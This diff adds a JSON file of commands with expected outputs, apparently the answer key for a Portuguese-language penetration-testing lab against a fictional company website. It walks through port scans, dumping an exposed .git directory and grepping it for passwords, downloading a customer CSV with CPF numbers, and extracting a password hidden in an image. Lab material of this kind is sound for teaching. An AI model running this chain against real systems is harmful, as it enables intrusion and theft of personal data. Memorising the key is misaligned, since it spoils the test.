@@ -1,0 +1,74 @@
+[
+  {
+    "cmd": "ls /srv",
+    "espera": "Permission denied"
+  },
+  {
+    "cmd": "nmap -p 80 203.0.113.10 2>&1 | grep -c mass_dns",
+    "espera": "\\s0\\s"
+  },
+  {
+    "cmd": "nmap -sT -p 22,80,443,8080 203.0.113.0/28",
+    "espera": "203\\.0\\.113\\.12[\\s\\S]*8080/tcp open"
+  },
+  {
+    "cmd": "nmap -sT 203.0.113.10",
+    "espera": "22/tcp +open[\\s\\S]*80/tcp +open"
+  },
+  {
+    "cmd": "curl -sI http://www.boinanuvem.exemplo/",
+    "espera": "Server: Apache/2\\.4\\.29"
+  },
+  {
+    "cmd": "curl -s http://www.boinanuvem.exemplo/robots.txt",
+    "espera": "/backup-antigo/"
+  },
+  {
+    "cmd": "curl -s -o /dev/null -w '%{http_code}\\n' http://www.boinanuvem.exemplo/admin-jefferson/",
+    "espera": "403"
+  },
+  {
+    "cmd": "cd ~/evidencias && wget -q -r -np -nH -R 'index.html*' http://www.boinanuvem.exemplo/.git/; ls -a",
+    "espera": "\\.git"
+  },
+  {
+    "cmd": "git log --oneline | cat",
+    "espera": "tirei a senha do repo"
+  },
+  {
+    "cmd": "git log -p | grep -i pass",
+    "espera": "Picanha@2021!"
+  },
+  {
+    "cmd": "curl -s http://www.boinanuvem.exemplo/backup-antigo/",
+    "espera": "clientes_export_2021\\.csv"
+  },
+  {
+    "cmd": "wget -q http://www.boinanuvem.exemplo/backup-antigo/clientes_export_2021.csv && wc -l clientes_export_2021.csv",
+    "espera": "1285 clientes_export_2021\\.csv"
+  },
+  {
+    "cmd": "head -n 2 clientes_export_2021.csv",
+    "espera": "nome;cpf;telefone"
+  },
+  {
+    "cmd": "wget -q http://www.boinanuvem.exemplo/img/festa-neide.png && file festa-neide.png",
+    "espera": "PNG image data, 240 x 160"
+  },
+  {
+    "cmd": "strings festa-neide.png | grep -i senha",
+    "espera": "Boi@1994"
+  },
+  {
+    "cmd": "sha256sum clientes_export_2021.csv",
+    "espera": "[0-9a-f]{64}"
+  },
+  {
+    "cmd": "curl -s -X POST -d 'usuario=a&senha=b' http://203.0.113.12:8080/login",
+    "espera": "inválidos"
+  },
+  {
+    "cmd": "echo fim",
+    "canal": "^EF:HTTP www\t80\tGET\t/robots\\.txt\t200"
+  }
+]
